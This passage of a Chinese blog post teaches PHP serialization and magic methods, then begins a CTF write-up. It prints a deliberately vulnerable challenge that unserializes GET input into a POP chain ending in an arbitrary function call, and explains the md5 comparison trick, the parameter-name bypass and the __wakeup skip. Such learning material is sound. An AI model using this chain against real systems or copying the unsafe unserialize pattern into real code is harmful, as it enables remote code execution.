class="params"><span class="keyword">array</span> <span class="variable">$a</span>, <span class="keyword">array</span> <span class="variable">$b</span></span>): <span class="title">int</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$a</span>[<span class="variable language_">$this</span>-&gt;key] &lt;=&gt; <span class="variable">$b</span>[<span class="variable language_">$this</span>-&gt;key];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$customers</span> = [</span><br><span class="line">    [<span class="string">&#x27;id&#x27;</span> =&gt; <span class="number">1</span>, <span class="string">&#x27;first_name&#x27;</span> =&gt; <span class="string">&#x27;John&#x27;</span>, <span class="string">&#x27;last_name&#x27;</span> =&gt; <span class="string">&#x27;Do&#x27;</span>],</span><br><span class="line">    [<span class="string">&#x27;id&#x27;</span> =&gt; <span class="number">3</span>, <span class="string">&#x27;first_name&#x27;</span> =&gt; <span class="string">&#x27;Alice&#x27;</span>, <span class="string">&#x27;last_name&#x27;</span> =&gt; <span class="string">&#x27;Gustav&#x27;</span>],</span><br><span class="line">    [<span class="string">&#x27;id&#x27;</span> =&gt; <span class="number">2</span>, <span class="string">&#x27;first_name&#x27;</span> =&gt; <span class="string">&#x27;Bob&#x27;</span>, <span class="string">&#x27;last_name&#x27;</span> =&gt; <span class="string">&#x27;Filipe&#x27;</span>]</span><br><span class="line">];</span><br><span class="line"><span class="comment">// sort customers by first name</span></span><br><span class="line"><span class="title function_ invoke__">usort</span>(<span class="variable">$customers</span>, <span class="keyword">new</span> <span class="title class_">Sort</span>(<span class="string">&#x27;first_name&#x27;</span>));</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$customers</span>);</span><br><span class="line"><span class="comment">// sort customers by last name</span></span><br><span class="line"><span class="title function_ invoke__">usort</span>(<span class="variable">$customers</span>, <span class="keyword">new</span> <span class="title class_">Sort</span>(<span class="string">&#x27;last_name&#x27;</span>));</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$customers</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>
</li>
<li><p><code>__clone()</code> → 克隆对象时执行</p>
<p>相当于创建副本，使修改内容不去影响原状态</p>
<p>就是独立开成为一个新的对象</p>
</li>
<li><p><code>  __sleep()</code> →</p>
<p>serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。 如果该方法未返回任何内容，则 null 被序列化，并产生一个 E_NOTICE 级别的错误。</p>
<p><code> __wakeup()</code> →</p>
<p><code>__sleep()</code>和<code>__wakeup()</code>是PHP中的两个魔术方法，<code>__sleep()</code>在对象被序列化 (serialize) 之前调用，用于指定要保存的属性（返回属性名数组）；而<code>__wakeup()</code>则在对象被反序列化 (<code>unserialize</code>) 之后调用，用于重新初始化对象资源（如数据库连接），常用于数据准备或清理，是处理对象持久化状态的关键。<br><code>__sleep()</code><br>调用时机: 在 serialize() 序列化对象之前。</p>
<p>作用: 开发者可以指定哪些属性需要被序列化。</p>
<p>返回值: 必须返回一个包含要序列化属性名称的数组。</p>
<p>用途: 节省空间，忽略大对象、临时资源，或提交未完成的事务。</p>
<p>注意: 如果未返回数组，或返回无效内容（非数组），会产生错误；不能返回父类的私有成员。 </p>
<p><code>__wakeup()</code></p>
<p>调用时机: 在 <code>unserialize()</code> 反序列化对象之后，对象构建完成时。</p>
<p>作用: 对象被反序列化后，重新初始化对象所需资源。</p>
<p>返回值: 无需返回值。</p>
<p>用途: 重新建立数据库连接，初始化缓存，执行其他设置操作。</p>
<p>注意: 在一些安全场景中（如反序列化漏洞），可以通过修改序列化数据（如属性数量）来尝试跳过<code>__wakeup()</code>的执行。</p>
</li>
</ul>
<h2 id="序列化反序列化示例"><a href="#序列化反序列化示例" class="headerlink" title="序列化反序列化示例"></a>序列化反序列化示例</h2><ul>
<li>序列化</li>
</ul>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$user</span>=<span class="keyword">array</span>(<span class="string">&#x27;xiao&#x27;</span>,<span class="string">&#x27;shi&#x27;</span>,<span class="string">&#x27;zi&#x27;</span>);</span><br><span class="line"><span class="variable">$user</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$user</span>.PHP_EOL);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$user</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">输出：</span></span><br><span class="line"><span class="comment">a:3:&#123;i:0;s:4:&quot;xiao&quot;;i:1;s:3:&quot;shi&quot;;i:2;s:2:&quot;zi&quot;;&#125;</span></span><br><span class="line"><span class="comment">Array</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">[0] =&gt; xiao</span></span><br><span class="line"><span class="comment">[1] =&gt; shi</span></span><br><span class="line"><span class="comment">[2] =&gt; zi</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">a:3:&#123;i:0;s:4:&quot;xiao&quot;;i:1;s:3:&quot;shi&quot;;i:2;s:2:&quot;zi&quot;;&#125;</span></span><br><span class="line"><span class="comment">a:array代表是数组，后面的3说明有三个属性</span></span><br><span class="line"><span class="comment">i:代表是整型数据int，后面的0是数组下标</span></span><br><span class="line"><span class="comment">s:代表是字符串，后面的4是因为xiao长度为4</span></span><br><span class="line"><span class="comment">依次类推</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>【数组元素个数】:&#123;i:<span class="number">0</span>【数组第几项】;s:<span class="number">4</span>【字符串长度】:<span class="string">&quot;xiao&quot;</span>;i:<span class="number">1</span>;s:<span class="number">3</span>:<span class="string">&quot;shi&quot;</span>;i:<span class="number">2</span>;s:<span class="number">2</span>:<span class="string">&quot;zi&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>



<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$pub</span>=<span class="string">&#x27;benben&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">jineng</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;pub;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>基础序列化示例</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">9</span>:<span class="string">&quot;testpub&quot;</span>;s:<span class="number">6</span>:<span class="string">&quot;benben&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>这里$pub变量是私有属性，所以在输出的时候会呈现为类名+属性名，由于私有属性所以在输出的变量前后会相当于有%00所以结果就是在序列化之后得到的数据长度会比类名+属性名多出两个字符长度</p>
<p>如果是public属性的话，输出的时候就只会有属性，没有类名，然后长度就是字符长度</p>
<p>如果是protected属性，输出的时候就是<code>*+</code>属性，但是长度会比<code>*+</code>属性还多两个，是因为实际上是%00+<code>*</code>+%00+属性</p>
<p>这个地方<code>jineng()</code>函数并不是对pub做了一个赋值过程，$this在类成员中是存在的，这里的作用就是读写并输出pub，然后这里就是$pub和pub都是在这个类下面的，输出的时候就是输出了两个部分</p>
<p>但是实际上输出的部分只有一个属性，所以只会在test后呈现为1</p>
<p>$this:当前对象实例，指到，相当于一个指针作用</p>
<p><strong>当前对象实例</strong> &#x3D; <strong>正在执行方法的那个具体对象</strong></p>
<p>提交最终的序列化对象，序列化也相当于一种编码，可以在执行的时候更简洁</p>
<h2 id="实例学习："><a href="#实例学习：" class="headerlink" title="实例学习："></a>实例学习：</h2><h3 id="2025geek-popself"><a href="#2025geek-popself" class="headerlink" title="2025geek popself"></a>2025geek popself</h3><div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">All_in_one</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$KiraKiraAyu</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$_4ak5ra</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$K4per</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Sams</span>āra;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$komiko</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Fox</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Eureka</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$QYQS</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sleep3r</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ivory</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;他还是没有忘记那个&quot;</span>.<span class="variable">$value</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;收集夏日的碎片吧&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$fox</span> = <span class="variable language_">$this</span>-&gt;Fox;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( !(<span class="variable">$fox</span> <span class="keyword">instanceof</span> All_in_one) &amp;&amp; <span class="variable">$fox</span>()===<span class="string">&quot;summer&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;QYQS enjoy summer&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;开启循环吧&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$komiko</span> = <span class="variable language_">$this</span>-&gt;komiko;</span><br><span class="line">            <span class="variable">$komiko</span>-&gt;<span class="title function_ invoke__">Eureka</span>(<span class="variable">$this</span>-&gt;L, <span class="variable">$this</span>-&gt;sleep3r);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;恭喜成功signin!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;welcome to Geek_Challenge2025!&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$f</span> = <span class="variable language_">$this</span>-&gt;Samsāra;</span><br><span class="line">        <span class="variable">$arg</span> = <span class="variable language_">$this</span>-&gt;ivory;</span><br><span class="line">        <span class="variable">$f</span>(<span class="variable">$arg</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;你能让K4per和KiraKiraAyu组成一队吗&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span>-&gt;KiraKiraAyu) &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$this</span>-&gt;K4per)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;KiraKiraAyu))===<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;K4per))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;boys和而不同&lt;br&gt;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;KiraKiraAyu))==<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;K4per))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;BOY♂ sign GEEK&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;开启循环吧&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;QYQS-&gt;partner = <span class="string">&quot;summer&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;BOY♂ can`t sign GEEK&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;KiraKiraAyu)).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;K4per).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;boys堂堂正正&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;再走一步...&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;_4ak5ra;</span><br><span class="line">        <span class="variable">$a</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>)</span>&#123;        </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$args</span>[<span class="number">0</span>])&lt;<span class="number">4</span> &amp;&amp; (<span class="variable">$args</span>[<span class="number">0</span>]+<span class="number">1</span>)&gt;<span class="number">10000</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;再走一步&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$args</span>[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;你要努力进窄门&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">summer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">find_myself</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;summer&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$payload</span> = <span class="variable">$_GET</span>[<span class="string">&quot;24_SYC.zip&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$payload</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$payload</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;没有大家的压缩包的话，瓦达西！&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<ol>
<li><p>变量带入是get方式传递给24_SYC.zip变量</p>
</li>
<li><p>非法字符绕过：非法字符会被解析成_(同一个地方栽第二次了，流汗黄豆)</p>
</li>
<li><p>if else语句中有反序列化，所以提交的内容是序列化格式的，提交之后自动序列化</p>
</li>
<li><p>这里<code>isset()</code>不是魔术方法，这里是检查内容是否为空的作用，并不是魔术方法那个触发</p>
</li>
<li><p>payload里相当于你可以提交很多东西，但是提交的内容要去挨个触发上面的函数，才能让回显得出来是flag，就是要挨个去触发函数</p>
</li>
<li><p>所有的变量都在all_in_one类下面，在制作payload时，声明变量需要注意必须写到类名</p>
</li>
<li><p>而且我们不是直接改变量本身，而是声明新的变量然后赋值过去</p>
</li>
<li><div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$payload</span> = <span class="variable">$_GET</span>[<span class="string">&quot;24_SYC.zip&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$payload</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$payload</span>);  <span class="comment">// 这里创建对象，但没保存到变量</span></span><br><span class="line">&#125; <span class="comment">// 脚本结束后，这些临时对象被销毁</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>最下面那部分就是一个小的脚本，所以实际上执行结束才是触发的开始，因为一开始的payload，就是通过销毁之后引用其他数据变化过来的</p>
</li>
<li><p>下一步就是md5的比较，满足第二个条件，但是不满足第一个强比较，有一个summer的赋值</p>
</li>
<li><p>执行 <code>$this-&gt;QYQS-&gt;partner = &quot;summer&quot;</code>，<code>__set()</code>魔术方法触发：不是，partner没有一开始的属性定义，直接会触发</p>
</li>
<li><p><strong>先触发条件判断中的 <code>$fox()</code>（它调用静态方法，不触发魔术方法），然后触发 <code>__call</code>，再触发 <code>__toString</code>，最后才触发 <code>__invoke</code>。</strong></p>
</li>
<li><p><code>__set()</code>触发之后的if条件判断，<code>$fox instanceof All_in_one</code>：检查<code>$fox</code>是否是<code>All_in_one</code>类的实例，<code>!</code>：逻辑非（取反），要同时满足类里没有变量<code>$fox</code>以及满足<code>$fox()</code>&#x3D;&#x3D;&#x3D;”summer”;这里的summer是字符串</p>
<ul>
